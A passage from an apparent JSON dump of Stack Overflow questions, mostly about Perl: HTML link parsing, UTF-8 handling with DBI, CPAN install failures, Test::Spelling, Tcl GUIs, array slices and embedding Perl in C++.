href=\"http://stackoverflow.com/questions/1695188/how-do-i-make-perl-scripts-recognize-parameters-in-the-win32-cmd-console\">How do I make Perl scripts recognize parameters in the Win32 cmd console?</a></li>\n<li><a href=\"http://stackoverflow.com/questions/3677114/running-a-perl-script-on-windows-without-extension\">Running a perl script on windows without extension</a></li>\n<li><a href=\"http://stackoverflow.com/questions/3013341/perl-execution-from-command-line-question\">Perl execution from command line question</a></li>\n<li><a href=\"http://stackoverflow.com/questions/2480069/how-can-i-read-piped-input-in-perl-on-windows\">How can I read piped input in Perl on Windows?</a></li>\n<li><a href=\"http://stackoverflow.com/questions/1286873/perl-on-windows-file-associations-and-i-o-redirection\">Perl on Windows, file associations and I/O redirection</a></li>\n<li><a href=\"http://stackoverflow.com/questions/705851/how-do-i-create-drag-and-drop-strawberry-perl-programs\">How do I create drag-and-drop Strawberry Perl programs?</a></li>\n</ul>\n"},{"tags":["c#","perl","bash","mono"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12548483,"title":"C# mono diagnostic bash vs perl backticks","body":"<p>I've installed mono on my ubuntu box and I'm trying to start a processes which starts several other children processes using C# but the program has very strict requirements and isn't starting correctly because of a environmental variable issues. When I call the program using backticks in perl it works fine. Can someone tell me how to emulate the backtick function in C#?</p>\n\n<pre><code>        System.Diagnostics.ProcessStartInfo ps = new System.Diagnostics.ProcessStartInfo(\"bash\");//perl /home/casey/Downloads/rosetta3.4/rosetta_tools/fragment_tools/make_fragments.pl tempsequence.fa\n        ps.RedirectStandardInput=true;\n            ps.RedirectStandardOutput = true;\n        ps.RedirectStandardError = true;\n        System.Diagnostics.Process proc = new System.Diagnostics.Process();\n        proc.StartInfo = ps;\n        ps.UseShellExecute = false;\n        proc.Start();\n        proc.StandardInput.WriteLine(\"cd \"+ projectfolder+\"/\"+projectname+\" ; perl /home/casey/Downloads/rosetta3.4/rosetta_tools/fragment_tools/make_fragments.pl tempsequence.fa;exit;\");\n            proc.WaitForExit();\n</code></pre>\n\n<p>This is the error it generates when run under C# it runs fine in perl.</p>\n\n<pre><code>/home/casey/Downloads/sparks-x/bin/buildinp_query.sh: 4: [: /home/casey/Downloads/sparks-x: unexpected operator\n/home/casey/Downloads/sparks-x/bin/psiblast.sh: 21: /home/casey/Downloads/sparks-x/bin/psiblast.sh: /blast/bin/blastpgp: not found\nTraceback (most recent call last):\n  File \"/home/casey/Downloads/sparks-x/bin/buildinp.py\", line 255, in run1\n    buildinp(fphipsiss, fmat, finp)\n  File \"/home/casey/Downloads/sparks-x/bin/buildinp.py\", line 238, in buildinp\n    seq1, ssec1, phipsi1, Fphipsi = rdphipsi(fphipsiss)\n  File \"/home/casey/Downloads/sparks-x/bin/buildinp.py\", line 9, in rdphipsi\n    for line in file(fn):\nIOError: [Errno 2] No such file or directory: 't001_.fasta.phipsi'\nsparks failed!\n\nno id specified. parsing filename instead.\nINTERMEDIATE: tempsequence.fa\nID: t001 CHAIN: _\nFile for psipred not found! Generating from scratch instead.\npicking fragments with options:\n                       DEBUG: 1\n            add_pdbs_to_vall: \n                       chain: _\n                     cleanup: 1\nexclude_homologs_by_pdb_date: 0\n                           f: tempsequence.fa\n                   fastafile: t001_.fasta\n                        homs: 1\n                          id: t001\n                n_candidates: 1000\n                     n_frags: 200\n             old_name_format: 0\n                  pick_frags: 1\n                      porter: 0\n                 porter_file: \n                     psipred: 1\n                psipred_file: \n                      rundir: /media/d5ad6bd2-65b3-498f-8355-5b2c55ee42b2/top10demo/automate/projects/showerror\n                       runid: t001_\n                         sam: 0\n                    sam_file: \n                 torsion_bin: 0\n--------------------------------------------------------------------------------\n\nFILENAME: t001_.fasta\nSequence: GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\nrunning sparks for phi, psi, and solvent accessibility predictions\n/home/casey/Downloads/sparks-x/bin/buildinp_query.sh t001_.fasta\nrunning psiblast for sequence: t001_.fasta\nAt line 180 of file phipsi_ss0.f\nFortran runtime error: Bad real number in item 3 of list input\nAborting: Can't run first SS0 predictor\nError in file: t001_.fasta.phipsi\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12603029,"title":"Collecting links from a HTML & Bulding a perl Hash","body":"<p>I'm attempting to grab all the links from HTML files stored locally and build a hash \nI'm using File::Find to get the html files but have left that out of the code.</p>\n\n<ol>\n<li>The first hash key will be the title  </li>\n<li>the second key the mirror the</li>\n<li>third key the part then the url</li>\n</ol>\n\n<p>like</p>\n\n<pre><code>$hash{$title}{$mirror}{$part}=$url;\n</code></pre>\n\n<p>i can get the links that have single parts &amp; single mirrors but i'm not getting the multiple parts currently I'm stuck in a loop. \nI'm getting the mirror by pattern matching the url but How do i the get the part if it exists else $part = \"part_1\"\ni then need to move onto the next url</p>\n\n<pre><code>#!/usr/bin/perl\n\nmy $Html = qq(\n    &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"&gt;\n    &lt;html&gt;\n      &lt;head&gt;\n      &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1250\"&gt;\n      &lt;meta name=\"generator\" content=\"PSPad editor, www.pspad.com\"&gt;\n      &lt;title&gt;First hash key&lt;/title&gt;\n      &lt;/head&gt;\n      &lt;body&gt;\n      &lt;div&gt;\n       &lt;br&gt;&lt;b&gt;Multi Links&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;!--colorstart:#FF0000--&gt;\n\n       &lt;span style=\"color:#FF0000\"&gt;&lt;!--/colorstart--&gt;&lt;b&gt;Mirror 1&lt;/b&gt;&lt;!--colorend--&gt;&lt;/span&gt;&lt;!--/colorend--&gt;\n       &lt;br&gt;&lt;a href=\"http://mirror1.com/rvvaq1hi\" target=\"_blank\"&gt;&lt;b&gt;Part 1&lt;/b&gt;&lt;/a&gt;\n       &lt;br&gt;&lt;a href=\"http://mirror1.com/w33h9ym2\" target=\"_blank\"&gt;&lt;b&gt;Part 2&lt;/b&gt;&lt;/a&gt;\n       &lt;br&gt;&lt;a href=\"http://mirror1.com/fdnppn15\" target=\"_blank\"&gt;&lt;b&gt;Part 3&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;\n\n        &lt;/div&gt;\n      &lt;div&gt;\n      &lt;br&gt;&lt;b&gt;Single link multiple mirrors&lt;/b&gt;&lt;br&gt;\n      &lt;br&gt;&lt;a href=\"http://mirror1.com/t2wx9603\" target=\"_blank\"&gt;&lt;!--colorstart:#FF0000--&gt;&lt;span style=\"color:#FF0000\"&gt;&lt;!--/colorstart--&gt;&lt;b&gt;Mirror 1&lt;/b&gt;&lt;!--colorend--&gt;&lt;/span&gt;&lt;!--/colorend--&gt;&lt;/a&gt;&lt;/div&gt;\n        &lt;br&gt;&lt;a href=\"http://mirror2.com/t2wx9603\" target=\"_blank\"&gt;&lt;!--colorstart:#FF0000--&gt;&lt;span style=\"color:#FF0000\"&gt;&lt;!--/colorstart--&gt;&lt;b&gt;Mirror 2&lt;/b&gt;&lt;!--colorend--&gt;&lt;/span&gt;&lt;!--/colorend--&gt;&lt;/a&gt;&lt;/div&gt;    \n\n        &lt;/div&gt;\n\n      &lt;/body&gt;\n    &lt;/html&gt;\n);\nmy @html = split(\\n,$Html);\n    my $TheMain;\n    my $Title;\n    my @Names=(Mirror1,Mirror2,Mirror3);\n    my %hash;\n\n      foreach my $line (@html)\n        {\n        print \"Da Line [$line]\\n\";\n        if ($line =~ m{&lt;title&gt;(.*?)&lt;/title&gt;} )\n          {\n           $Title = $1;\n           print \"$Title\\n\";\n          }\n         $line =~ s/\\\"/'/g;   # Double quotes to single\n         $line=~ s{\\n}{}g;  #remove \\n\n         $line=~ s{\\s+}{ }g;#remove excessive spaces\n\n          $TheMain = $TheMain . $line;\n        }\n        print \"$TheMain\\n\";\n     unless ($TheMain eq \"\") # unless empty enter the loop\n       {\n        while ($TheMain =~ m{a href=(.*?)/a}) \n        {\n            my $A = $1;\n            print \"the A  $A\\n\";  ## stuck in a loop\n            my ($url,$part);\n            $A =~ s/&lt;.*?color.*?&gt;//ig;\n            while ($A =~ m{\\'(http.*?)\\'.*?&lt;b&gt;(.*?)&lt;/b&gt; }gi)\n              {\n               $url = $1;\n               $part = $2;\n               if ($part =~m/part/i)\n                {\n                  $part =~ s/ /_/;\n                }\n               else\n                {\n                  $part = \"part_1\";\n                } \n              }\n\n           foreach my $mirror (@NAMES)   # fillters out unwanted links\n            {\n              if ($url =~/$mirror/i)\n                {\n                  $hash{$Title}{$mirror}{$part}=$url;\n                }\n            }\n          }\n        }\n\nfor my $Title (sort keys %hash) \n  {\n    for my $Host  (sort keys %{$hash{$Title}})\n      {\n\n          for my $part (sort keys %{$hash{$Title}{$Host}})\n            {\n\n               my $url = $hash{$Title}{$Host}{$part};\n               print \"$Title,$url\\n\";\n             } \n      }\n     }    \n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12602388,"title":"match a string and get the the word next to it in perl","body":"<p>I have an html file \"statistics.htm\". Got the data in the html file to a variable.</p>\n\n<p>suppose in the variable i have below data:</p>\n\n<pre><code>&lt;ul class=\"chart-legend\"&gt;\n    &lt;li class=\"label-1\"&gt;\n      &lt;div&gt;&lt;em&gt;&lt;/em&gt;FTP&lt;br&gt;\n      0 B&lt;/div&gt;\n    &lt;/li&gt;\n    &lt;li class=\"label-2\"&gt;\n      &lt;div&gt;&lt;em&gt;&lt;/em&gt;HTTP&lt;br&gt;\n      589 KB&lt;/div&gt;\n    &lt;/li&gt;\n    &lt;li class=\"label-3\"&gt;\n      &lt;div&gt;&lt;em&gt;&lt;/em&gt;POP3/IMAP&lt;br&gt;\n      0 B&lt;/div&gt;\n    &lt;/li&gt;\n    &lt;li class=\"label-4\"&gt;\n      &lt;div&gt;&lt;em&gt;&lt;/em&gt;SMTP&lt;br&gt;\n      0 B&lt;/div&gt;\n    &lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>suppose if customer gives FTP as an argument i want the FTP value which is 0 B in above case.</p>\n\n<p>How can i achieve this?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":12601869,"title":"using length and encoding with perl","body":"<p>my mysql database is encoded ut8_generic_ci when i read some text field from the database using dbi\nand store it on a $variable and run the lenght function on this variable i get a numeric lenght</p>\n\n<pre><code>  my $data retrive_text_from_db(); #using dbi\n  print length $data; \n</code></pre>\n\n<p>but when i store the $data on a text file then try to read it on another script and run the length function i get sometimes different length </p>\n\n<pre><code>     open T, '&lt;'  ,'file.txt' or die $!;\n     binmode(T, \":utf8\");\n     my $text;\n     {local $/; $text=&lt;T&gt;; }\n     print length $text; \n</code></pre>\n\n<p>did someone experience this problem /could someone tell what could be the root of the problem and how can i solve it ?</p>\n"},{"tags":["perl","hash","multidimensional"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12403510,"title":"Perl: multidimentional hash","body":"<p>suppose I have the following data </p>\n\n<p><strong>cluster1:d(A),f(C)s,(A)</strong></p>\n\n<p><strong>cluster2:r(D),h(D),f(A)</strong></p>\n\n<p>I want this out put </p>\n\n<p>output:</p>\n\n<pre><code>   cluster1:A-&gt;2\n   cluster1:C-&gt;1\n   cluster2:D-&gt;2\n   cluster2:A-&gt;1\n</code></pre>\n\n<p>here is my try,but it is not correct , the part that I am trying to count characters has a problem that I cant fix\nthe code is a part of very big code ,and I want exactly multidimensional hash</p>\n\n<pre><code>use strict;\nuse Data::Dumper;\n my %count;\nwhile (&lt;DATA&gt;) {\n    my %HoH;\n    my ( $cluster, $ch ) = split (/:/,$_);\n    $HoH{$cluster}={split /[()]+/,$ch}; \n    for my $clust ( keys %HoH ) {\n        for my $character ( keys %{ $HoH{$clust} } ) {\n            $count{$clust}{$HoH{$clust}{$character}}++;\n     }\n    }\n}\nprint Dumper(\\%count);\nforeach my $name (sort keys %count) {\n    foreach my $subject (keys %{$count{$name}}) {\n        print \"$name:$subject-&gt;$count{$name}{$subject}\\n\";\n    }\n}\n</code></pre>\n\n<p><strong>DATA</strong></p>\n\n<p>cluster1:d(A),f(C)s,(A)</p>\n\n<p>cluster2:r(D),h(D),f(A)</p>\n"},{"tags":["perl","module","install","cpan"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":538,"score":1,"question_id":9363372,"title":"CPAN Perl modules installer not finding tar file","body":"<p>It seems I have a configuration problem when installing Perl modules through CPAN and I don't know how to correct it:</p>\n\n<pre><code>[root@ip JESSE]# pwd\n/root/.cpan/sources/authors/id/J/JE/JESSE\n\n[root@ip JESSE]# ls -l\ntotal 240\n-rw-r--r-- 1 root root 105464 Feb 20 11:39 CHECKSUMS\n-rw-r--r-- 1 root root   9223 Apr 12  2011 Locale-Maketext-Simple-0.21.tar.gz\n-rw-r--r-- 1 root root 125483 Feb 20 11:39 WWW-Mechanize-1.72.tar.gz\n\n[root@ip JESSE]# cpan -i WWW::Mechanize\nCPAN: Storable loaded ok (v2.20)\nReading '/root/.cpan/Metadata'\n  Database was generated on Mon, 20 Feb 2012 11:10:26 GMT\nRunning install for module 'WWW::Mechanize'\nRunning make for J/JE/JESSE/WWW-Mechanize-1.72.tar.gz\nCPAN: Digest::SHA loaded ok (v5.61)\nCPAN: Compress::Zlib loaded ok (v2.033)\nChecksum for /root/.cpan/sources/authors/id/J/JE/JESSE/WWW-Mechanize-1.72.tar.gz ok\nCPAN: Archive::Tar loaded ok (v1.82)\nUncompressed /root/.cpan/sources/authors/id/J/JE/JESSE/WWW-Mechanize-1.72.tar.gz successfully\nUsing Tar:/bin/tar xvf \"WWW-Mechanize-1.72.tar\":\nCouldn't untar WWW-Mechanize-1.72.tar\nCPAN: File::Temp loaded ok (v0.22)\nCPAN: CPAN::Meta loaded ok (v2.112150)\nPackage seems to come without Makefile.PL.\n  (The test -f \"/root/.cpan/build/JESSE-n72IRU/Makefile.PL\" returned false.)\n  Writing one on our own (setting NAME to WWWMechanize)\n  Had problems unarchiving. Please build manually\nRunning make test\n  Make had some problems, won't test\nRunning make install\n  Make had some problems, won't install\n\n[root@ip JESSE]# ls -l\ntotal 240\n-rw-r--r-- 1 root root 105464 Feb 20 11:39 CHECKSUMS\n-rw-r--r-- 1 root root   9223 Apr 12  2011 Locale-Maketext-Simple-0.21.tar.gz\n-rw-r--r-- 1 root root 125483 Feb 20 11:39 WWW-Mechanize-1.72.tar.gz\n\n[root@ip JESSE]# which tar\n/bin/tar\n\n[root@ip JESSE]# which gzip\n/bin/gzip\n</code></pre>\n\n<p><strong>The problem seems to be here:</strong></p>\n\n<pre><code>Uncompressed /root/.cpan/sources/authors/id/J/JE/JESSE/WWW-Mechanize-1.72.tar.gz successfully\nUsing Tar:/bin/tar xvf \"WWW-Mechanize-1.72.tar\":\nCouldn't untar WWW-Mechanize-1.72.tar\n</code></pre>\n\n<p>The tar.gz file is indeed uncompressed and can be found here in a new directory:</p>\n\n<pre><code>/root/.cpan/build/JESSE-KjCEMS/WWW-Mechanize-1.72.tar\n</code></pre>\n\n<p>If I run the same command from inside the shell, I get some more info:</p>\n\n<pre><code>cpan[1]&gt; install WWW::Mechanize\nCPAN: Storable loaded ok (v2.20)\nReading '/root/.cpan/Metadata'\n  Database was generated on Mon, 20 Feb 2012 11:10:26 GMT\nRunning install for module 'WWW::Mechanize'\nRunning make for J/JE/JESSE/WWW-Mechanize-1.72.tar.gz\nCPAN: Digest::SHA loaded ok (v5.61)\nCPAN: Compress::Zlib loaded ok (v2.033)\nChecksum for /root/.cpan/sources/authors/id/J/JE/JESSE/WWW-Mechanize-1.72.tar.gz ok\nScanning cache /root/.cpan/build for sizes\nUse of uninitialized value $newdir in substitution (s///) at /usr/lib64/perl5/Cwd.pm line 502.\nUse of uninitialized value $newdir in chdir at /usr/lib64/perl5/Cwd.pm line 510.\nUse of chdir('') or chdir(undef) as chdir() is deprecated at /usr/lib64/perl5/Cwd.pm line 510.\nUse of uninitialized value $newdir in pattern match (m//) at /usr/lib64/perl5/Cwd.pm line 525.\nUse of uninitialized value $newdir in split at /usr/lib64/perl5/Cwd.pm line 531.\n..........................................................................--DONE\nDEL(1/10): /root/.cpan/build/CPAN-1.9600-jGTV10\nDEL(2/10): /root/.cpan/build/File-Which-1.09-yoVWZC\nDEL(3/10): /root/.cpan/build/Test-Script-1.07-aJWrXb\nDEL(4/10): /root/.cpan/build/Probe-Perl-0.01-gzZ2eR\nDEL(5/10): /root/.cpan/build/IPC-Run3-0.044-AP6EMp\nDEL(6/10): /root/.cpan/build/Time-HiRes-1.9721-xxseE6\nDEL(7/10): /root/.cpan/build/CPAN-Meta-YAML-0.003-wGtH0a\nDEL(8/10): /root/.cpan/build/JSON-PP-2.27105-fvkwNa\nDEL(9/10): /root/.cpan/build/Package-Constants-0.02-7Ms_OL\nDEL(10/10): /root/.cpan/build/Module-Metadata-1.000004-tXKIBB\nCPAN: Archive::Tar loaded ok (v1.82)\nUncompressed /root/.cpan/sources/authors/id/J/JE/JESSE/WWW-Mechanize-1.72.tar.gz successfully\nUsing Tar:/bin/tar xvf \"WWW-Mechanize-1.72.tar\":\nCouldn't untar WWW-Mechanize-1.72.tar\nCPAN: File::Temp loaded ok (v0.22)\nCPAN: CPAN::Meta loaded ok (v2.112150)\nPackage seems to come without Makefile.PL.\n  (The test -f \"/root/.cpan/build/JESSE-DGrTh_/Makefile.PL\" returned false.)\n  Writing one on our own (setting NAME to WWWMechanize)\n  Had problems unarchiving. Please build manually\nRunning make test\n  Make had some problems, won't test\nRunning make install\n  Make had some problems, won't install\nFailed during this command:\n JESSE/WWW-Mechanize-1.72.tar.gz              : unwrapped NO -- untar failed\n</code></pre>\n\n<p>It seems to me that $newdir is not being updated with the dynamically generated  <code>/root/.cpan/build/JESSE-DGrTh_/</code>  or <code>/root/.cpan/build/JESSE-KjCEMS/</code> or whatever the system generates or at least that information is not getting to the tar command</p>\n\n<p>Does anyone know how I can fix the mechanism without having to resort to a manual install ?</p>\n"},{"tags":["mysql","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12600358,"title":"charset utf8 is not working in perl code","body":"<p>I a newbie in Perl, working on a legacy application. I am missing some special characters like Ã¤,Ã¥,Ã¶ in my database. previously, Mysql database was in latin1 collation, now changed to UTF-8 default. When I look in database values, these characters are not changed (still getting  some other characters for Ã¥,Ã¶,Ã¤). I looked into perl code, I found this encoding and charset seems it is not working.  any help is appreciated. thanks.</p>\n\n<pre><code>     use Encode qw/is_utf8 decode/;\n     my($q) = CGI-&gt;new();\n    $q-&gt;charset('utf-8');\n    $q-&gt;header(-charset =&gt; 'utf-8', -expires =&gt; '-1d')\n</code></pre>\n\n<p>connection to database</p>\n\n<pre><code>my($dbh) = DBI-&gt;connect($config{'dbDriver'},$config{'dbUser'},$config{'dbPass'}) or die \"Kunde inte ansluta till $config{'dataSource'}: \" . $DBI::errstr;\n\n$dbh-&gt;{'mysql_enable_utf8'} = 1;\n$dbh-&gt;do('SET NAMES utf8');\n</code></pre>\n"},{"tags":["c++","python","perl","performance","lua"],"answer_count":7,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":988,"score":6,"question_id":2103728,"title":"Selecting An Embedded Language","body":"<p>I'm making an application that analyses one or more series of data using several different algorithms (agents). I came to the idea that each of these agents could be implemented as separate Python scripts which I run using either the Python C API or Boost.Python in my app.</p>\n\n<p>I'm a little worried about runtime overhead TBH, as I'm doing some pretty heavy duty data processing and I don't want to have to wait several minutes for each simulation. I will typically be making hundreds of thousands, if not millions, of iterations in which I invoke the external \"agents\"; am I better of just hardcoding everything in the app, or will the performance drop be tolerable? </p>\n\n<p>Also, are there any other interpreted languages I can use other than Python?</p>\n"},{"tags":["perl","spellchecking","pod"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":37,"score":2,"question_id":12599099,"title":"Why does Test::Spelling mark function/method names as having typos?","body":"<p>Let's say I have this dummy Perl package in <code>test.pm</code>:</p>\n\n<pre><code>package test;\n\nuse strict;\nuse warnings;\n\n=head1 DESCRIPTION\n\n=head2 env\n\nReturn the environment name.\n\n=cut\n\nsub env { return \"environment name\"; }\n\n=head2 hst\n\nReturn the history file name.\n\n=cut\n\nsub hst { return \"history file\"; }\n\n=head2 hst_dir\n\nReturn the directory containing the history file.\n\n=cut\n\nsub hst_dir { return \"history directory\"; }\n\n1;\n</code></pre>\n\n<p>Then, I run a spell check from command line using <code>Test::Spelling</code>...</p>\n\n<pre><code>$ perl -MTest::More -MTest::Spelling \\\n&gt; -e 'pod_file_spelling_ok(\"test.pm\", \"spell check\"); done_testing;'\n</code></pre>\n\n<p>..., and my function names <code>env</code> and <code>hst</code> are marked as a typos, but <code>hst_dir</code> is accepted:</p>\n\n<pre><code>not ok 1 - spell check\n#   Failed test 'spell check'\n#   at -e line 1.\n# Errors:\n#     env\n#     hst\n1..1\n# Looks like you failed 1 test of 1.\n</code></pre>\n\n<p>I know I can list a custom dictionary with <code>add_stopwords()</code>, but in my opinion function names should not be spell-checked at all.</p>\n\n<p>Did I miss some fine-print in the documentation?</p>\n"},{"tags":["perl","gui","tcl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12596059,"title":"Display contents in the GUI using tcl","body":"<p>I am new to GUI and i was trying to create a simple GUI in tcl. It have a push button which when pressed runs a code and generates a output '.l' file in the directory. But i want the output to be printed in the GUI itself. SO how am i supposed to change this code to do the task.</p>\n\n<pre><code>proc makeTop { } {\n    toplevel .top ;#Make the window\n    #Put things in it\n    label .top.lab -text \"This is output Window\" -font \"ansi 12 bold\"\n    text .top.txt \n    .top.txt insert end \"XXX.l\"\n    #An option to close the window.\n    button .top.but -text \"Close\" -command { destroy .top }\n    #Pack everything\n    pack .top.lab .top.txt .top.but\n}\n\nlabel .lab -text \"This is perl\" -font \"ansi 12 bold\"\nbutton .but -text \"run perl\" -command { exec perl run_me }\npack .lab .but\n</code></pre>\n\n<p>Can anyone help me in displaying the contents of output file XXX.l in the GUI itself???</p>\n"},{"tags":["perl","activeperl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":49,"score":0,"question_id":12595014,"title":"Regarding perl 5.8.3 DBI installation","body":"<p>Noticed our system has perl 5.8.3.  I am unable to locate the DBI.pm.    When i did     perl -V it was showing the below output. Pasted it below.  Using HPUX11 os. All installed files under the perl installation directory are having root or bin as owner of the file.  I dont have root password now.   I want to install DBI.pm.  how can i do it.  Do i need to download it from CPAN or Active Perl Website?</p>\n\n<p>perl -V  </p>\n\n<blockquote>\n  <p>Characteristics of this binary (from libperl):   Compile-time options:\n  MULTIPLICITY USE_ITHREADS USE_LARGE_FILES PERL_IMPLICIT_CONTEXT<br>\n  Locally applied patches:\n          ActivePerl Build 809\n          22218 Remove the caveat about detached threads crashing on Windows\n          22201 Avoid threads+win32 crash by freeing Perl interpreter slightly later\n          22169 Display 'out of memeory' errors using low-level I/O\n          22159 Upgrade to Time::Hires 1.55\n          22120 Make 'Configure -Dcf_by=...' work\n          22051 Upgrade to Time::HiRes 1.54\n          21540 Fix backward-compatibility issues in if.pm   Built under hpux   Compiled at May 17 2005 18:12:56</p>\n\n<pre><code>/opt/perl/lib/5.8.3/PA-RISC1.1-thread-multi\n/opt/perl/lib/5.8.3\n/opt/perl/lib/site_perl/5.8.3/PA-RISC1.1-thread-multi\n/opt/perl/lib/site_perl/5.8.3\n/opt/perl/lib/site_perl\n</code></pre>\n</blockquote>\n\n<p>All installed files under the perl installation directory are having root or bin as user id.  I dont have root password now.   I want to install DBI. How can i do it?</p>\n"},{"tags":["perl","hash","perl-data-structures"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":217,"score":2,"question_id":5537009,"title":"How do I loop through a hash?","body":"<p>Given the following variable:</p>\n\n<pre><code>$test = {\n  '1' =&gt; 'A',\n  '2' =&gt; 'B',\n  '3' =&gt; 'C',\n  '4' =&gt; 'G',\n  '5' =&gt; 'K',\n}\n</code></pre>\n\n<p>How can loop through all assignments without knowing which keys I have?</p>\n\n<p>I would like to fill a select box with the results as label and the keys as hidden values.</p>\n"},{"tags":["regex","perl","regex-negation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12596478,"title":"Writing a regex in perl to compare a method definition in java","body":"<p>I want to compare method definition like :</p>\n\n<pre><code>1. static void main(String[] args){\n\n2. static void main(String[] args)\n{\n3. int sum()\n4. int abc(int a,int b){\n</code></pre>\n\n<p>I just have the method's name and I'm reading the file one line at a time.</p>\n\n<p>The regex shouldn't compare method calls such as :</p>\n\n<pre><code>sum();\nOBJ.abc(1,2);\n</code></pre>\n\n<p>I wrote a regex which is not working :</p>\n\n<pre><code>$srcLine =~ m/$methodName[\\([A-Z]*[a-z]*[0-9]*\\s*[,]*\\(*\\)*\\)]*/)\n</code></pre>\n\n<p>I'm getting a compilation error at this line.</p>\n\n<p><strong>EDIT</strong></p>\n\n<pre><code>$srcLine =~ m/$methodName\\((?!~)+\\)/\n</code></pre>\n\n<p>This is another regex where I am comparing it with the \n\"methodName('anything other than ~')\"</p>\n"},{"tags":["perl","constants"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12581628,"title":"Access name of a constant, not only its value?","body":"<p>In Perl, is it possible to pass a constant to a function and then display the name of the constant literally as well as use its value? Maybe by passing some kind of escaped constant name to the function?</p>\n\n<p>Here is an example of what I would like to do, of course the code in exitError() yet doesn't do what I want to do.</p>\n\n<pre><code>use constant MAIL_SEND_FAILED =&gt; 1;\n\n# exitError($exitcode)\nsub exitError\n{\n    my $exitCode = $_[0];\n    say \"error, exitcode: $exitCode\"; # output constant name as human readable exitcode, e.g. MAIL_SEND_FAILED\n    exit $exitCode; # use value of exitcode, e.g. 1\n}\n\nexitError(MAIL_SEND_FAILED);\n# function call should effectively execute this code\n# say \"error, exitcode: MAIL_SEND_FAILED\";\n# exit 1;\n</code></pre>\n"},{"tags":["perl","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":50,"score":-1,"question_id":12595008,"title":"perl script to print those lines of a file that contain 5 fields separated by comma and discard other lines","body":"<p>I have a text file which contains :</p>\n\n<pre><code>abc,def,100,200,dasdas\n\ndasd,dsfsf,2312,123,\n\nadasa,sdffs,1312,1231212,adsdasdasd\n\nqeweqw,das,13123,13,asdadasds\n\ndsadsaa,asdd,12312,123\n</code></pre>\n\n<p>I want the output to be only those lines from that file that contains 5 fields separated by comma like:</p>\n\n<pre><code>abc,def,100,200,dasdas\n\nadasa,sdffs,1312,1231212,adsdasdasd\n\nqeweqw,das,13123,13,asdadasds\n</code></pre>\n\n<p>I am using a script like this:</p>\n\n<pre><code>#!/usr/bin/perl -w\nopen (MYFILE, \"/home/debarshi/Desktop/amartest.txt\");\n$total_nwords = 0;\nwhile (my $line = &lt;MYFILE&gt;) {\n\n    @list = split(/,/, $line);\n        #print \"list is $list[0]\";\n    $nwords = @list;\n        $total_nwords = $total_nwords + $nwords;\n}\nif ($total_nwords == 14)\n{\n  print \"$line\";\n}\nclose (MYFILE);\n</code></pre>\n\n<p>Wonder if a perl one-liner would also solve the problem?</p>\n"},{"tags":["arrays","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":82,"score":3,"question_id":12595101,"title":"interpolation of array inside a array","body":"<p>When I was trying to print a specific element in array, I have mistakenly typed the name of the same array inside [ ] as element and got some output as shown. I thought that it is taking the size of the array and printing that number of characters, which was proven to be wrong by the output.     </p>\n\n<pre><code>@array = (0..10, 12);\n\nprint \"@array[@array]\";\n</code></pre>\n\n<p>prints</p>\n\n<pre><code> Use of uninitialized value in join or string at\n /home/VAR121/Program/Practise_Perl/Arrays.pl line 9.\n 0 1 2 3 4 5 6 7 8 9 10\n</code></pre>\n\n<p>I went one step ahead and edited code as shown below</p>\n\n<pre><code>print \"@array[@array[@array]]\";\n\noutput as: `0 1 2 3 4 5 6 7 8 9 10 0`  Use of uninitialized value in join or string at\n /home/VAR121/Program/Practise_Perl/Arrays.pl line 9.\n</code></pre>\n\n<p>Now I tried to put a number inside the second array instead of again giving array name as below.</p>\n\n<pre><code>print \"@array[@array[1,2,3]]\";\n</code></pre>\n\n<p>output as</p>\n\n<pre><code> 1 2 3\n</code></pre>\n\n<p>But no warning message this time. </p>\n\n<p>What it is trying to print? and What is the reason behind this behavior. </p>\n"},{"tags":["c++","perl","xs"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":123,"score":6,"question_id":12403729,"title":"C++ calling perl code - eval_sv not passing arguments to script","body":"<p>I have the below sample program which pushes the arguments to Perl stack and then calls \"eval_sv\". The sample perl statements get executed but i'm not able to retrieve the variables passed from C++ as Perl arguments. Please let me know what i am missing in the below program</p>\n\n<p><strong>Output of the program</strong></p>\n\n<blockquote>\n  <p>Hello World </p>\n  \n  <p>Test </p>\n  \n  <p>100Testing complete</p>\n</blockquote>\n\n<p>This line doesn't print the value of $a and $b</p>\n\n<pre><code>string three = \"print 'Test\\n'; my $z = 100; print $a; print $b; print $z;\";\n</code></pre>\n\n<p>Here is my code:</p>\n\n<pre><code>#include &lt;EXTERN.h&gt;\n#include 